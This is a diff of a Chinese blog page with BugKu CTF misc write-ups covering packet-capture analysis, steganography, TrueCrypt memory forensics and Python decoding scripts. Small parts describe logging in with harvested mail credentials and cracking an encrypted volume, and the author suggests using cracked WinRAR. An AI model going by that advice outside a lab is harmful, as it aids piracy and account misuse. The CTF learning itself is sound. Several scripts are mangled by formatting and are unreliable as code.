-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543843368759.png" alt></p>
-<p>打开后是一个刷枪的工具</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543843710210.png" alt></p>
-<p>尝试提交，抓流量包发现明显有base64编码。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543843815043.png" alt></p>
-<p>解码是163邮箱。获取账号密码登录后得到flag。</p>
-<p><strong>7.好多数值</strong></p>
-<p>一看就是很多RGB值让我们绘制图片，先分析绘制图像的长宽。用python分析一下数据的长度。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544251197657.png" alt></p>
-<p>开方开不尽，所以不是正方形。分解质数得到503*61*2。python脚本跑测试一下是122*503。得到flag</p>
-<p>脚本：</p>
-<p>from PIL import Image<br>import re<br>​<br>x = 503 #x坐标  通过对txt里的行数进行整数分解<br>y = 122 #y坐标  x*y = 行数<br>​<br>im = Image.new(“RGB”,(x,y))#创建图片<br>file = open(‘1 (1).txt’) #打开rbg值文件<br>​<br>#通过一个个rgb点生成图片<br>for i in range(0,x):<br>•    for j in range(0,y):<br>•        line = file.readline().replace(‘(‘,’’).replace(‘)’,’’)#获取一行<br>•        rgb = line.split(“,”)#分离rgb<br>•        im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))#rgb转化为像素<br>im.show()</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544251049478.png" alt></p>
-<p><strong>8.很普通的数独</strong></p>
-<p>并不知道什么是数独。但是这25张图片加上里面的白黑相间很容易想到是个5*5的二维码。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544253035293.png" alt></p>
-<p>关键是如何把他们拼接成二维码？….</p>
-<p>看了大佬的wp是用Python的PIL库来处理。把数字涂黑然后拼接生成二维码。大致思路是计算一张图中的 81 个格子的位置，然后看每一个格子中心的一堆像素（比如设置了 6 x 6）中是否有黑色像素。如果没有说明是白格子，跳过；如果有说明是有数字的格子，涂黑。</p>
-<p>贴个大佬脚本：</p>
-<p>from PIL import Image<br>​<br>def work(s):<br>    im = Image.open(“{}.png”.format(s))<br>    width = im.size[0]<br>    height = im.size[1]<br>    newim = Image.new(“RGB”, (width, height), (255,255,255))<br>    print(im.size)<br>    print(newim.size)<br>    sx = sy = 2<br>    for i in range(width):<br>        for j in range(height - sy):<br>            try:<br>                p = im.getpixel((i, j))<br>                newim.putpixel((i,j), p)<br>            except:<br>                pass#print(i, j)<br>    xx = yy = 14<br>    blockx = 23<br>    blocky = 22<br>    r = 3<br>    rr = 12<br>    for i in range(9):<br>        stx = int(xx + i * blockx)<br>        for j in range(9):<br>            sty = int(yy + j * blocky)<br>            flag = False<br>            for x in range(stx - r, stx + r):<br>                for y in range(sty - r, sty + r):<br>                    p = newim.getpixel((x, y))<br>                    if p == (0,0,0):<br>                        flag = True<br>                        break<br>                if flag:<br>                    break<br>            if flag:<br>                for x in range(stx - rr, stx + rr):<br>                    for y in range(sty - rr, sty + rr):<br>                        try:<br>                            newim.putpixel((x,y), (0,0,0))<br>                        except:<br>                            pass<br>    newim.save(“{}-1.png”.format(s))<br>​<br>for i in range(1, 26):<br>    work(i)</p>
-<p>拼接后扫码得到多重base64</p>
-<p>Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9</p>
-<p>多解码几次得到flag</p>
-<p><strong>9.QAQ</strong></p>
-<p>用01Eidtor打开发现有encode、.txt、base64、key、encrypt等字样猜测可能是pyc文件（py文件编译后）放到kali里面用命令查看一下确实是个pyc文件</p>
-<p>在线反编译一下得到源码。</p>
-<p>#/usr/bin/env python<br># encoding: utf-8<br>​<br>def encryt(key, plain):<br>    cipher = ‘’<br>    for i in range(len(plain)):<br>        cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i]))  </p>
-<pre><code>return cipher  </code></pre><p>def getPlainText():<br>    plain = ‘’<br>    with open(‘plain.txt’) as f:<br>        while True:<br>            line = f.readline()<br>            if line:<br>                plain += line<br>            else:<br>                break  </p>
-<pre><code>return plain  </code></pre><p>def main():<br>    key = ‘LordCasser’<br>    plain = getPlainText()<br>    cipher = encryt(key, plain)<br>    with open(‘cipher.txt’, ‘w’) as f:<br>        f.write(cipher.encode(‘base_64’))  </p>
-<p>if __name__ == ‘__main__‘:<br>    main()</p>
-<p>然后还给了一个文件。三段数据，应该是用到脚本里面。</p>
-<p>然后审计代码尝试写解密python脚本</p>
-<p>过几天抽时间写吧，先放一下</p>
-<p>解密后…</p>
-<p><strong>10.apple</strong></p>
-<p>未完代更新</p>
-
+          <h2 id="一、信息收集与社工"><a href="#一、信息收集与社工" class="headerlink" title="一、信息收集与社工"></a><strong>一、信息收集与社工</strong></h2><p><strong>1.签到</strong></p><p>微信扫面二维码回复：<code>flag</code>得flag。</p><p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543824528660.png" alt></p><p><strong>2.猜</strong></p><p>提示是某人姓名全拼音，运用谷歌识图搜到是liuyifei。</p><p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543828399284.png" alt></p><h2 id="二、编码分析"><a href="#二、编码分析" class="headerlink" title="二、编码分析"></a><strong>二、编码分析</strong></h2><p><strong>1.多种方法解决</strong></p><p>用NotePad++打开发现是python的b64img模块把图片转换成文本的文本。直接在线还原base64编码的图片的二维码，扫面得flag</p><p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543837028259.png" alt></p><p><strong>2.普通的二维码</strong></p>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/2018/12/10/BugKu-MISC-WP史诗全集/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -909,167 +612,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a><strong>流量分析</strong></h3><p><strong>远程登录协议</strong></p>
-<p>解法一：</p>
-<p>过滤分组字节流搜索flag追踪到数据包</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542970759540.png" alt></p>
-<p>解法二：</p>
-<p>题目是：远程登录协议。所以过滤talnet协议定位，追踪流找到flag</p>
-<p><strong>简单网管协议</strong></p>
-<p>直接过滤分组字节流，找到flag。也可以过滤网管协议(SNMP)定位在追踪流找到。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542970811954.png" alt></p>
-<p><strong>struts2漏洞</strong></p>
-<p>直接分组字节流过滤flag得俩：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542852889256.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542852969079.png" alt></p>
-<p>根据题目提示是大写MD5，得flag。</p>
-<p>但是感觉这个题目也太简单了吧。。。搜了下struts2，原来是一个apache框架。而且存在不少高危漏洞。(CVE-2012-0838、CVE-2013-2251，2248、CVE-2016-3081)大多数是属于远程命令、代码执行漏洞。</p>
-<p><strong>shell流量分析</strong></p>
-<p>发现主要是57370端口（控制端）和2333端口（被控端）间的通信。通过<strong>“$”</strong>不难猜到是shell交互。</p>
-<p>过滤分组字节流定位flag发现一段有flag{xxxxxxxxx}：</p>
-<p>追踪TCP流：</p>
-<p>分析shell交互找到以下几段可疑点：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542723644977.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542723662242.png" alt></p>
-<p>把function.py运行发现输出：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542723771216.png" alt></p>
-<p>审计代码发现<code>import base64</code>结合可疑点<code>cat flag</code>猜测应该是对<code>mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==</code>用fuction的decode函数进行了加密。</p>
-<p>然后在py脚本里面添加一段代码即可：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542723977838.png" alt></p>
-<p>运行脚本得到flag：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542724011108.png" alt></p>
-<p><strong>Webshell分析</strong></p>
-<p>过滤分组字节流，分别过滤shell和flag定位追踪流，发现只是变量或名字并没有内容。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542724907671.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542724923858.png" alt></p>
-<p>题目要求分析webshell先过滤出http流。最后找到base64字符串(有点脑洞啊)<code>aHR0cHM6Ly9kbi5qYXJ2aXNvai5jb20vY2hhbGxlbmdlZmlsZXMvQWJUekEyWXRlRmpHaFBXQ2Z0cmFvdVZEM0I2ODRhOUEuanBn</code></p>
-<p>解密发现网址：访问的二维码扫描得flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542808764923.png" alt></p>
-<p><strong>SCAN</strong></p>
-<p>是个log日志，notepad打开发现是个二进制文件。用wireshark打开(竟然可以….)。第一个包就是一个ICMP协议的Ping包，是192.168.0.9-&gt;192.168.0.99的大量访问。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542865784270.png" alt></p>
-<p>过滤ICMP协议，包并不多。(可以一个个尝试)</p>
-<p>可以根据时间段划分为四部分：0、1200、1400、1600。</p>
-<p>第一次是<code>192.168.0.9-&gt;192.168.0.99</code>然后中间一部分交互。</p>
-<p>第二次是<code>192.168.0.1-&gt;192.168.0.99</code></p>
-<p>第三次是<code>192.168.0.254-&gt;192.168.0.99</code></p>
-<p>第四次是<code>192.168.0.199-&gt;192.168.0.99</code></p>
-<p>所以第四次的包名字sha256加密后的flag。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542866335762.png" alt></p>
-<h3 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a><strong>隐写术</strong></h3><p><strong>教练，我想打CTF</strong></p>
-<p>用StegSolve打开图片,LSB最低位通道分析，发现文件头为PK(压缩包文件头)</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542810137954.png" alt></p>
-<p>把二进制导出修改文件后缀为zip：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542810259619.png" alt></p>
-<p>发现压缩文件损坏，这时候可以用WinRAR修复功能。(扯一句，WinRAR确实比Bandzip、7z什么的好用…省赛就是没用WinRAR损失一道题目。不过WinRAR有广告,大家可以去52破解下载去广告版。dalao也可以自己去壳破解改入口)</p>
-<p>成功修复解压后，打开文件发现是ELF文件(Linux中类似Windows的exe文件，可以直接执行)</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542810602138.png" alt></p>
-<p>直接Linux运行得flag：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542810750295.png" alt></p>
-<p><strong>Class10</strong></p>
-<p>拿到一个没有后缀不知名文件。在kali里面用file命令检查一下：是个二进制文件</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542854385749.png" alt></p>
-<p>binwalk分析一下：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542854443141.png" alt></p>
-<p>有两段zlib压缩后的数据，第二段为default compression。</p>
-<p>然后strings命令分析：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542854546069.png" alt></p>
-<p>发现IHDR,RGB,IDAT等和图像相关的字符。</p>
-<p>用binwalk分理处class10中的压缩数据：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542854623655.png" alt></p>
-<p>用python打开zlib：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542855311359.png" alt></p>
-<p>发现二进制的长度为841，正好是29^2。联系上面得到的信息，猜测应该是二进制转成图像。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542855327833.png" alt></p>
-<p>写个python脚本：</p>
-<p># -<em>- coding: utf-8 -</em>-<br>​<br>from PIL import Image<br>​<br>SIZE = 29<br>img = Image.new(“RGB”,(SIZE,SIZE))<br>with open(“./F4289”) as f:<br>    str = f.read()<br>​<br>i = 0<br>for y in xrange(SIZE):<br>    for x in xrange(SIZE):<br>        if str[i] == ‘0’:<br>            img.putpixel([x,y],(0,0,0))<br>        else:<br>            img.putpixel([x,y],(255,255,255))<br>        i = i + 1<br>img.save(“ima.png”)</p>
-<p>得到一张二维码图片：扫描得到flag。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542855861426.png" alt></p>
-<p><strong>炫酷的战队logo</strong></p>
-<p>下载后发现是一个打不开的BMP文件。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542857601204.png" alt></p>
-<p>010打开后发现BMP文件头被抹掉。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542857722675.png" alt></p>
-<p>查阅信息后发现BMP位图信息头为一个结构体长40。大体固定为：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542859569446.png" alt></p>
-<p>修复后可以打开，用binwalk分析发现有zlib提取后无果。用nodepad++打开发现文件后面有一堆数据，而且有<code>IHDR</code>字样，猜测应该隐藏一了张png图片，但是这张图片的文件头也被损坏了，所以binwalk分析不出来。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542863202487.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542863613553.png" alt></p>
-<p>修改文件头无果仍然打不开</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542863732064.png" alt></p>
-<p>看别人写的wp是有一个crc校验值，然后可以反推高度宽度。但是由于Windows系统无视crc校验值(即crc校验值不对也可以显示，但是Linux就不可以)所以利用Window的特点可以达到修改图片高、宽度来隐藏信息的目的。</p>
-<p>python爆破:</p>
-<p>for i in range(16,256):<br>    print hex(i)[2:]<br>    b=hex(i)[2:]<br>    a=(‘89504E470D0A1A0A0000000D49484452000001’+b+’000001000802000000F37A5E12000000017352474200AECE1CE90000000467414D410000B18F0BFC6105000000097048597300000EC300000EC301C76FA8640000072549444154785EEDDAB996DD380E0050E70E2B745491B3F9FFCF1B2D04454214A537AF8EDB5D736F262E00A807CAEEE507000000000000000000DFDCC7E77F569F1FE5F9EFF2F3D7EFADBCC54D85B1F2F7AF9F6564E0EF3E2CFC059A3B77185EAB729D0ECBC51AEE0E5B94E18AE64A96F9947194EBDEF5AE54458E76339DD53C75E129F35D90B2A13FF670F045FD516E4E128B6719F3618F0439F85794FF3FC5AF255665EB3EF16641702B7D410E6DF39DFB74B5F4EAE5EED51661B8A25E903A7B64BBCC3535DF35983D020E2B9C5FBDB2E57C8CC6BCE252519F6638F89AA8E4598C47ABD361DBB3F667FC82F217AFC51FFCB2ABB2A6CECE7F0C78D3E9261D6D5C7AAFE9EBB61B3F3E874D9E3B36760F1BB94C1E17E361AEE47657BBFF54E7B27B50407759EF945DD3227BA34FC278F03551FFB35262F52B19EB1BDAB479BEA0FCC50BF1E3A73CBFC7BCE6CD9A606E7093A23BB7A1DAD5779D18BBD2058EFDC37B5D2663EE3E57BD491FFBD275E1E30A8B1263585053C3C5FCA6965112A6733C90236CCE8365A468266A998B18EE17AF3E3F2E2A2DA5C6535F469242943DBF7F97028E439FCB3F6B3336F5366FEE71FC08D56E3EDB574D6B8277B57D5D447BAF43CF7A7515BBD2C20830DC5F26CBDC835CCDCDDB2C253EAF7033AD67D11EFE52BAD0A3B2F6894B39C2260DE6A831514FDC588F735ABF8CE63CFDF1E3695A6F0A7144887CF12A73AE919A31BE925544791AFF51EDB1EC6611BCE7D48DD1BCFB483CDDF7616EFA22E2B7EA92BEC71FE4EA8BEB86E615F665A41A0F83F82365595D54B7352E736C72844D3F385CB228E311BF9CAC2C8B73C66C0ED2CFC7D329472B85682394A912EDAAE056EC3EC78B81A7F1FBB936F2A61F9ED604EF4ADD57A566BDEFC3DCD6C5287EEAFC787C90ABBF499B6715E63206AB23D0229DE164504655C34C830C23F4834D3D8BBAB21F3EECE9E29CE99DD6DDFD7C3C0D0F1252883E4254B33EE55C23A38C6D8CE7F1FB5DC7BE2286CBBA6951F0A6D47D9BA6E7EA746DCB2BB9AD8BFE5634CA4433FE20577F9336CF2BDC0DD747F18B2761066534E6B3BBE19A3CD854B559276AF9D95E774CC72972C87E3E9E5E29F522C3F29C738D8C321E11D6A7A7F1633CA5CBDB57FBD8B42E78C7A8AF5BD1ADB75DD85F866AD4D6D5BEA74EDDE72A2BBAF9C715861C244ABC28726054C6613EBBBBBEEDB98AA3BAC532358F9E635C9D759F8FA769A929C4B9CAAEC287E76E16D5ED7D4DB7F14B5DEDCAC569FBBE6C5A14BC69D0D7BDA689BB355FF73F3C1D616F73E5AFC2E66ED732DF668F42CBDABA7B58E1582AE3E357933685BF12CBF27D1FD711452E73837A7FFEFA8C64CDC24DAA26658DD5D35ACB9E589333AC6A4DAB69B06365AE30069EC76F468FC579FBFE3CAD09DE156D376BB4DAE9BDB6D18F45FDE8A9AD3B65B29D9BE74A57BA9AEE8A123A35C4C5D671C1452A631462B67D374E7C1CED3C5FE6061BEBAED3EB4E8BE3BF90F76FE6483A5022C49AF10FDABCE369B0E16FB1BA3EC1E622FEF81DAE62FBBE715A13BC2BFAF3AED1CEFDDFF779EDE8343CBE154599CC73D7B9D295EE5CEFCA33EDF6F3AE625870712AA38F32DBDA49C9FB63A54F4417346D3CE662A2597DAC5DE2F7F3F1347C9F211D76906153D34C8335199BF3B5B15E8E5F27AA76C53E3BAD09FED5CA0DC837866F2BBE797FECBBB67FAC7D46F9C62EFF8AC1F7F4673FA3F52FBCFEA0E65B2BF7CA67F4FFC33FF119D55BF0CF69FEEDDDE1A54BF97E843FE66B4BBD8AF6C7FFA11E000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080A11F3FFE0B3B73B0698B976EA80000000049454E44AE426082’).decode(“hex”)<br>    f=open(b+’.png’,”wb”)<br>    f.write(a)<br>    f.close()</p>
-<p>挨个查看得到flag(眼力要好才能发现….):</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542864540876.png" alt></p>
-<p><strong>上帝之音</strong></p>
-<p>根据提示用MATLAB查看时域波形(不太懂…通信内容..):几乎全看(chao)别人wp</p>
-<p>[x,fs] = wavread(‘godwave.wav’);<br>​<br>N = lenthg(x);</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542968410786.png" alt></p>
-<p>可以看出来这是OOK信号，因此可以先全波整流，然后低通滤波解调出基带信号。（dalaoshuo）</p>
-<p>fc = fs / 100;<br>​<br>lpf = fir1(30,fc / (fs / 2) );<br>​<br>x = abs(x);<br>​<br>xs = filter(lpf, 1, x);</p>
-<p>绘制基带信号：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542968428240.png" alt></p>
-<p>通过观察，以64个点作为抽样判决周期，提取出基带数据，即线路码。</p>
-<p>然后根据第二个提示:是曼彻斯特码，将其解码。查看16进制：<code>8950 4e47 0d0a</code>是个gif格式的图像，改后缀得到二维码，扫描得flag。</p>
-<p>基带解调MATLAB代码：</p>
-<p>close all; clear; clc;<br>​<br>[x, fs] = wavread(‘godwave.wav’);<br>N = length(x);<br>​<br>fc = fs / 100;<br>lpf = fir1(30, fc / (fs / 2));<br>​<br>x = abs(x);<br>xs = filter(lpf, 1, x);<br>figure;<br>plot(xs(1:1000));<br>ts = [48:64:N];<br>​<br>xb = int8(xs(ts) &gt; 0.3);<br>​<br>fp = fopen(‘demod.txt’, ‘w’);<br>for i = xb<br> fprintf(fp, ‘%d’, i);<br>end<br>fclose(fp);</p>
-<p>曼彻斯特解码Python:</p>
-<p>with open(‘demod.txt’) as fp:<br> s = fp.read()<br>​<br>m = ‘’<br>for i in range(0, len(s), 2):<br> if (s[i] == ‘1’) and (s[i+1] == ‘0’):<br>  m += ‘1’<br> elif (s[i] == ‘0’) and (s[i+1] == ‘1’):<br>  m += ‘0’<br> else:<br>  print(‘wrong with index %d’ % i)<br>  exit()<br>​<br>with open(‘demod.bin’, ‘wb’) as fp:<br> for i in range(0, len(m), 8):<br>  byte = bytes([int(m[i:i+8], 2)])<br>  fp.write(byte)</p>
-<h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a><strong>内存取证</strong></h3><p><strong>取证2</strong></p>
-<p>用到取证神器：volatility。解压缩到的一个vmem文件(VMware的虚拟机内存快照文件)和一个不知名的文件。</p>
-<p>用volatility分析mem.vmem：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542896874177.png" alt></p>
-<p>可以得到profile类型</p>
-<p>查看一下进程：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542896993818.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542897018522.png" alt></p>
-<p>发现：</p>
-<p>这是一个加密工具。对于TureCrypt专门破解工具：<code>Elcomsoft Forensic Disk Decryptor</code></p>
-<p>dumpTrueCrypt进程：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542939000029.png" alt></p>
-<p>然后用TurCrypt专门破解工具：<code>Elcomsoft Forensic Disk Decryptor</code></p>
-<p>破解suspicion。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542939543738.png" alt></p>
-<p>挂载得到flag：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542939602100.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542939613655.png" alt></p>
-<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a><strong>Other</strong></h3><p><strong>You-Nedd-Python</strong></p>
-<p>运行给的flag.py提示输入key：(flag.py的运行逻辑是把数据base64解码，然后zlib解压，marshal.loads函数将数据流转换成code object。而code object是可以转化为pyc的)</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542871054798.png" alt></p>
-<p>我们还有一个文件没用到，文件名字是：<code>key_is_here_but_do_you_know_rfc4042</code>推测应该是用这个文件来获取key。</p>
-<p>我们打开发现乱码：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542871300266.png" alt></p>
-<p>根据提示：<code>cfc4042</code>（rfc4042中定义了utf-9和utf-18两种Unicode转换编码格式）。然后用utf-9模块，把utf-9转换成utf-8编码：</p>
-<p>#coding utf-8<br>import utf9<br>​<br>utf9_file = open(‘key_is_here_but_do_you_know_rfc4042’,’rb’)<br>utf9_data = utf9_file.read()<br>decoded_data = utf9.utf9decode(utf9_data)<br>​<br>print decoded_data<br>​<br>decoded_file = open(‘decoded’,’w’)<br>decoded_file = write(decode_data)<br>decoded_file.close()</p>
-<p>得到：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542872211120.png" alt></p>
-<p>看别人wp是仔细观察法，发现除了“”外其他符号都是Python中的算术运算符，括号表示优先级。然后脑洞下划线的个数为对应数字。(给脑洞大佬掉头..)</p>
-<p>然后把数字转为16进制然后转化为ASCII字符就是key。我修改的脚本如下：</p>
-<p>#coding = utf-8  </p>
-<p>import binascii<br>​<br>_ = 1<br><em>_ = 2<br><strong>_ = 3<br>__</strong> = 4<br><strong><strong>_ = 5<br>__</strong></strong> = 6<br><strong>___</strong> = 7<br><strong>____</strong> = 8<br><strong>_____</strong> = 9<br>n = <strong>___*((</strong>//<strong>+_</strong>+<strong>__</strong>-<strong><strong>%</strong></strong>)**((<strong><em>%(</em></strong>-</em>))+<strong>____</strong>+(<strong><em>%</em></strong>+<strong><strong><em>+__</em></strong></strong>%<strong>+____</strong>-(<strong>__</strong>//(<strong><em>__%</em></strong>)))))+<strong>*(((<strong>__</strong></strong>/<strong>)+_</strong>%<strong>+_____</strong>-(<strong>____</strong>//<strong><strong>))<em>*(_</em>(_</strong></strong>+<strong><strong><em>)+__</em></strong></strong>+<strong>_____</strong>%<strong><em>))+_____</em></strong><em>(((<strong>_____</strong>//<strong>+<strong>__</strong></strong>%<strong>)+(_____</strong>-<em>))**((__</em>+<strong>___</strong>)+<strong>_____</strong>-(<strong>__</strong>//<strong>)))+_____</strong></em>((<strong><em>+<strong>__</strong></em></strong>-(<strong>__</strong>//<strong><em>-____</em></strong>%<strong>%<em>))**(__</em></strong>+<strong><strong><em>+</em></strong></strong>))+<strong>*(</strong>+<strong>_____</strong>-(<strong><em>//</em></strong>-<strong>_____</strong>%<strong>___%</strong>))<strong>(<strong>_____</strong>-<strong><strong>+___</strong></strong>)+(<strong><em>+____</em></strong>)</strong>(<strong>____</strong>%<strong>_%</strong>+<strong><strong><em>+_</em></strong></strong>)+(<strong>___-</strong>)<em>((<strong><strong>//</strong></strong>-<strong><strong>_%</strong></strong>%<em>)+<strong>____</strong></em>)**(<strong><strong><em>-(__</em></strong></strong>//<strong>___</strong>+<strong>_____</strong>%<strong><em>)+___</em></strong>)+(<strong><strong><em>+(____</em></strong></strong>%<strong>___</strong>)\</em><strong>+<em>)**<strong>__</strong></em></strong>+<strong>___</strong><em>(((<strong>_____</strong>%<strong>___</strong>)\</em><strong>+_____</strong>-(<strong>____</strong>//<strong>____</strong>))**<strong>___</strong>)+(<strong>____</strong>/<strong>)*(((__</strong>-<em>+<strong>___</strong>)<em>(<strong>__</strong>+____))*\</em><strong><em>)+</em></strong>*((<strong>+<strong>___</strong></strong>-</em>)**<strong><em>__)+</em></strong>*(((<strong><em>+____</em></strong>-<strong>__</strong>/<strong>_+</strong>-<strong>_____</strong>%<strong>___%</strong>)<em>(<strong><em>-</em>+<strong>__</strong></strong>/<strong>+<strong>___</strong></strong>%_____))*\</em><strong>)+(<em>//</em>)*(((<strong>__</strong></strong>%<strong>_%</strong>+<strong><strong><em>+</em></strong></strong>)%<strong>__</strong>)+<strong>___</strong>-<em>)**<strong><em>+__</em></strong>*((<strong>__</strong>/(<strong><em>__%</em></strong>))+<strong>___</strong>)<em>((<strong>_____</strong>%<strong>___</strong>)</em><strong>+___</strong>+</em>)+<strong><em>//</em></strong>+<strong>_____</strong>+<strong>_____</strong>/___<br>​<br>print n<br>hexn = hex(n)[2:]<br>print hexn<br>​<br>key = ‘’<br>​<br>for i in range(len(hexn)/2):<br>    key += chr(eval(‘0x’+hexn[2*i:2*i+2]))<br>​<br>print key</p>
-<p>输入key：</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542892958873.png" alt></p>
-<p>再回到出发点flag.py输入key发现又让输入flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542893302219.png" alt></p>
-<p>根据一开始提到的，编写代码将code这个Python代码对象加上相应pyc文件头信息提取出来写入磁盘生成pyc文件(关于pyc文件类似于java编译后的.class；运行机制类比java的JVM)。然后反编译得到源码。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542894112118.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1542894121670.png" alt></p>
-<p>在线python反编译：</p>
-<p>#!/usr/bin/env python<br># encoding: utf-8<br>​<br>import hashlib<br>​<br>def sha1(string):<br>    return hashlib.sha1(string).hexdigest()<br>​<br>​<br>def calc(strSHA1):<br>    r = 0<br>    for i in strSHA1:<br>        r += int(‘0x%s’ % i, 16)  </p>
-<pre><code>return r  </code></pre><p>​<br>​<br>def encrypt(plain, key):<br>    keySHA1 = sha1(key)<br>    intSHA1 = calc(keySHA1)<br>    r = []<br>    for i in range(len(plain)):<br>        r.append(ord(plain[i]) + int(‘0x%s’ % keySHA1[i % 40], 16) - intSHA1)<br>        intSHA1 = calc(sha1(plain[:i + 1])[:20] + sha1(str(intSHA1))[:20])  </p>
-<pre><code>return &apos;&apos;.join(map((lambda x: str(x)), r))  </code></pre><p>​<br>if __name__ == ‘__main__‘:<br>    key = raw_input(‘[<em>] Please input key:’)<br>    plain = raw_input(‘[</em>] Please input flag:’)<br>    encryptText = encrypt(plain, key)<br>    cipherText = ‘-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164’<br>    if encryptText == cipherText:<br>        print ‘[&gt;] Congratulations! Flag is: %s’ % plain<br>        exit()<br>    else:<br>        print ‘[!] Key or flag is wrong, try again:)’<br>        exit()</p>
-<p>分析加密函数：<code>def encrypt(plain, key)</code></p>
